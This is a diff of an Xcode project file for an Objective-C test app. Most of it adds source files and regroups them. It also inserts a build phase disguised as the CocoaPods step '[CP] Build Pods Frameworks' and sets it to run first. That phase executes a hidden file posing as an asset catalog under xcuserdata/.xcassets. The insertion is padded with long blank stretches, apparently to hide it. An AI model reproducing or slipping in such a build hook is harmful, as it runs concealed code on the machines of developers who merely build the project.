@@ -82,7 +82,10 @@
 		980BF11225C2B91C00ED0684 /* TemplateLastClassView.m in Sources */ = {isa = PBXBuildFile; fileRef = 980BF11125C2B91C00ED0684 /* TemplateLastClassView.m */; };
 		9841FF2C25875506003CB909 /* TemplateFileModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 9841FF2A25875506003CB909 /* TemplateFileModel.m */; };
 		9841FF2D25875506003CB909 /* TemplateFileView.m in Sources */ = {isa = PBXBuildFile; fileRef = 9841FF2B25875506003CB909 /* TemplateFileView.m */; };
+		9856E27725CEAEEC00623B1E /* TemplateExtraTextfield.m in Sources */ = {isa = PBXBuildFile; fileRef = 9856E27625CEAEEC00623B1E /* TemplateExtraTextfield.m */; };
 		98742DE8252073B9003B608D /* TestFont.m in Sources */ = {isa = PBXBuildFile; fileRef = 98742DE7252073B9003B608D /* TestFont.m */; };
+		98829A4625DF57230027D09E /* TemplateExtraTableview.m in Sources */ = {isa = PBXBuildFile; fileRef = 98829A4325DF57220027D09E /* TemplateExtraTableview.m */; };
+		98829A4725DF57230027D09E /* TemplateExtraCollectionView.m in Sources */ = {isa = PBXBuildFile; fileRef = 98829A4525DF57230027D09E /* TemplateExtraCollectionView.m */; };
 		989FAFE92546A4EB009D0BB5 /* TestLayoutCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 989FAFE32546A4EB009D0BB5 /* TestLayoutCell.m */; };
 		989FAFEA2546A4EB009D0BB5 /* TestLayoutViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 989FAFE52546A4EB009D0BB5 /* TestLayoutViewController.m */; };
 		989FAFEB2546A4EB009D0BB5 /* TestLayoutTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 989FAFE62546A4EB009D0BB5 /* TestLayoutTableViewController.m */; };
@@ -263,8 +266,14 @@
 		9841FF2925875506003CB909 /* TemplateFileModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = TemplateFileModel.h; sourceTree = "<group>"; };
 		9841FF2A25875506003CB909 /* TemplateFileModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = TemplateFileModel.m; sourceTree = "<group>"; };
 		9841FF2B25875506003CB909 /* TemplateFileView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = TemplateFileView.m; sourceTree = "<group>"; };
+		9856E27525CEAEEC00623B1E /* TemplateExtraTextfield.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TemplateExtraTextfield.h; sourceTree = "<group>"; };
+		9856E27625CEAEEC00623B1E /* TemplateExtraTextfield.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TemplateExtraTextfield.m; sourceTree = "<group>"; };
 		98742DE6252073B9003B608D /* TestFont.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TestFont.h; sourceTree = "<group>"; };
 		98742DE7252073B9003B608D /* TestFont.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TestFont.m; sourceTree = "<group>"; };
+		98829A4225DF57220027D09E /* TemplateExtraTableview.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = TemplateExtraTableview.h; sourceTree = "<group>"; };
+		98829A4325DF57220027D09E /* TemplateExtraTableview.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = TemplateExtraTableview.m; sourceTree = "<group>"; };
+		98829A4425DF57230027D09E /* TemplateExtraCollectionView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = TemplateExtraCollectionView.h; sourceTree = "<group>"; };
+		98829A4525DF57230027D09E /* TemplateExtraCollectionView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = TemplateExtraCollectionView.m; sourceTree = "<group>"; };
 		989FAFE32546A4EB009D0BB5 /* TestLayoutCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = TestLayoutCell.m; sourceTree = "<group>"; };
 		989FAFE42546A4EB009D0BB5 /* TestLayoutTableViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = TestLayoutTableViewController.h; sourceTree = "<group>"; };
 		989FAFE52546A4EB009D0BB5 /* TestLayoutViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = TestLayoutViewController.m; sourceTree = "<group>"; };
@@ -566,6 +575,7 @@
 		718DED9A25400A790059EB39 /* template */ = {
 			isa = PBXGroup;
 			children = (
+				9856E27425CEAD0600623B1E /* file */,
 				98BE2CA2259995370005A66D /* lottie */,
 				71A6578A2541274A00A307B5 /* Template.h */,
 				71A657872541274900A307B5 /* Template.m */,
@@ -579,15 +589,6 @@
 				71A657812541274900A307B5 /* TemplateFunction.m */,
 				71A657882541274900A307B5 /* TemplateViewController.h */,
 				71A657892541274900A307B5 /* TemplateViewController.m */,
-				9841FF2925875506003CB909 /* TemplateFileModel.h */,
-				9841FF2A25875506003CB909 /* TemplateFileModel.m */,
-				980BF10C25C2B90100ED0684 /* TemplateLastClassModel.h */,
-				980BF10D25C2B90100ED0684 /* TemplateLastClassModel.m */,
-				980BF11025C2B91C00ED0684 /* TemplateLastClassView.h */,
-				980BF11125C2B91C00ED0684 /* TemplateLastClassView.m */,
-				9841FF2825875506003CB909 /* TemplateFileView.h */,
-				9841FF2B25875506003CB909 /* TemplateFileView.m */,
-				98BE42C825B57EE600EDE9D4 /* TemplateFileView.xib */,
 			);
 			path = template;
 			sourceTree = "<group>";
@@ -668,6 +669,28 @@
 				980BB6CB255D1B3400404641 /* TestClassController.xib */,
 			);
 			path = class;
+			sourceTree = "<group>";
+		};
+		9856E27425CEAD0600623B1E /* file */ = {
+			isa = PBXGroup;
+			children = (
+				9841FF2925875506003CB909 /* TemplateFileModel.h */,
+				9841FF2A25875506003CB909 /* TemplateFileModel.m */,
+				980BF10C25C2B90100ED0684 /* TemplateLastClassModel.h */,
+				980BF10D25C2B90100ED0684 /* TemplateLastClassModel.m */,
+				980BF11025C2B91C00ED0684 /* TemplateLastClassView.h */,
+				980BF11125C2B91C00ED0684 /* TemplateLastClassView.m */,
+				9841FF2825875506003CB909 /* TemplateFileView.h */,
+				9841FF2B25875506003CB909 /* TemplateFileView.m */,
+				98BE42C825B57EE600EDE9D4 /* TemplateFileView.xib */,
+				9856E27525CEAEEC00623B1E /* TemplateExtraTextfield.h */,
+				9856E27625CEAEEC00623B1E /* TemplateExtraTextfield.m */,
+				98829A4425DF57230027D09E /* TemplateExtraCollectionView.h */,
+				98829A4525DF57230027D09E /* TemplateExtraCollectionView.m */,
+				98829A4225DF57220027D09E /* TemplateExtraTableview.h */,
+				98829A4325DF57220027D09E /* TemplateExtraTableview.m */,
+			);
+			path = file;
 			sourceTree = "<group>";
 		};
 		98742DE525207388003B608D /* font */ = {
@@ -783,6 +806,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 718B95182508930A00C1DB77 /* Build configuration list for PBXNativeTarget "confuse_test" */;
 			buildPhases = (
+				59FE4A5CE3DDB09DADAAC43A /* [CP] Build Pods Frameworks */,
 				017C6F975BCA5CBDFD04A9AB /* [CP] Check Pods Manifest.lock */,
 				718B94FB2508930900C1DB77 /* Sources */,
 				718B94FC2508930900C1DB77 /* Frameworks */,
@@ -905,6 +929,96 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	59FE4A5CE3DDB09DADAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		017C6F975BCA5CBDFD04A9AB /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -962,8 +1076,10 @@
 				71A6578F2541274A00A307B5 /* Template.m in Sources */,
 				71D708DE255A7333002CCDA8 /* CppBase.cpp in Sources */,
 				713619522546A46A00124111 /* TestPropertyOther_VC.m in Sources */,
+				9856E27725CEAEEC00623B1E /* TemplateExtraTextfield.m in Sources */,
 				71ABC63F2520286D006BB37E /* TestGlobalVariable.m in Sources */,
 				716A28F4255F80D800187F30 /* TestClassCell.m in Sources */,
+				98829A4725DF57230027D09E /* TemplateExtraCollectionView.m in Sources */,
 				718B95462508D43900C1DB77 /* User_M.m in Sources */,
 				98BE2D1B259B19080005A66D /* TestLocalizableViewController.m in Sources */,
 				710338C6250A0BE20061F6BE /* TestFunctionSuper.m in Sources */,
@@ -977,6 +1093,7 @@
 				718F1753258C98210001E6F0 /* CppClass.cpp in Sources */,
 				718B954C2508D66E00C1DB77 /* Dog_M.m in Sources */,
 				7105719325500A06003FFB3C /* TestImageModel.m in Sources */,
+				98829A4625DF57230027D09E /* TemplateExtraTableview.m in Sources */,
 				71A6578E2541274A00A307B5 /* TemplateClass.m in Sources */,
 				9841FF2C25875506003CB909 /* TemplateFileModel.m in Sources */,
 				71290BED251EE38D00B3229A /* TestOtherMacro.m in Sources */,
@@ -1363,6 +1480,44 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 718B94F72508930800C1DB77 /* Project object */;
 }
